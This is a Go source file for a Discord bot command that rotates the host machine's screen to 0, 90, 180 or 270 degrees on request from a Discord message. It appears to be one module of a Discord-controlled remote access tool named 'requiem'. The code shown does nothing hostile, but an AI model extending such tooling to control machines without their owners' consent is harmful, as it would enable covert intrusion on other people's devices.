package commands

import (
	"strings"

	"requiem/funcs"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

func (*RotateCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	content := strings.Join(args, " ")

	rotated := false

	if utils.HasFlag(content, "0") {
		rotated = funcs.RotateScreen(0)
	} else if utils.HasFlag(content, "90") {
		rotated = funcs.RotateScreen(1)
	} else if utils.HasFlag(content, "180") {
		rotated = funcs.RotateScreen(2)
	} else if utils.HasFlag(content, "270") {
		rotated = funcs.RotateScreen(3)
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
		return
	}

	if rotated {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully rotated screen.", msg.Reference())
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to rotate screen.", msg.Reference())
	}
}

func (*RotateCommand) Name() string {
	return "rotate"
}

func (*RotateCommand) Info() string {
	return "Rotates the device display."
}

type RotateCommand struct{}
